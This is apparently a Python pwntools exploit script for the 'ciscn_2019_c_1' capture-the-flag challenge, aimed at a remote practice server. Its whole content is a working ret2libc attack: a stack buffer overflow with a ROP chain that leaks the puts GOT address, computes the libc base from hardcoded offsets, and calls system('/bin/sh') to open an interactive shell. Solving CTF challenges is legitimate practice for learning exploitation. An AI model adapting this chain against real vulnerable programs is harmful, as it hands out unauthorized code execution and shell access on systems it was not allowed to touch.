from pwn import *
#from LibcSearcher import *

context(log_level = "debug", arch = "amd64", os = "linux")

#r = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')
r = remote('node3.buuoj.cn', '27896')

#raw_input()

offset = 0x7fffffffe0f8 - 0x7fffffffe0a0


pop_rdi = 0x0000000000400c83 # pop rdi ; ret

puts_plt = elf.symbols['puts']  #puts_plt = 0x4006e0
puts_got = elf.got['puts']      #puts_got = 0x602020
encrypt = 0x4009a0

print r.recvuntil("choice!\n")
r.sendline("1")
print r.recvuntil("to be encrypted\n")

payload = p64(0) + 'a' * 0x50 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(encrypt)

r.sendline(payload)
print r.recvuntil("Ciphertext\n")
print r.recvuntil("\n")

GOT_puts = r.recvuntil("\n").split()[0]
for i in range(len(GOT_puts), 8):
    GOT_puts += b'\x00'
GOT_puts = u64(GOT_puts)
print ('%#x' %GOT_puts)


#libc = LibcSearcher("puts", GOT_puts)
#libc_base = GOT_puts - libc.dump("puts")
#libc_system = libc_base + libc.dump("system")
#libc_sh = libc_base + libc.dump("str_bin_sh")
libc_base = GOT_puts - 0x0809c0
libc_system = libc_base + 0x4f440
libc_sh = libc_base + 0x1b3e9a

ret = 0x4006b9
payload = p64(0) + 'a' * 0x50 + p64(ret) * 0x5 + p64(pop_rdi) + p64(libc_sh) + p64(libc_system) 

r.sendline(payload)

r.interactive()





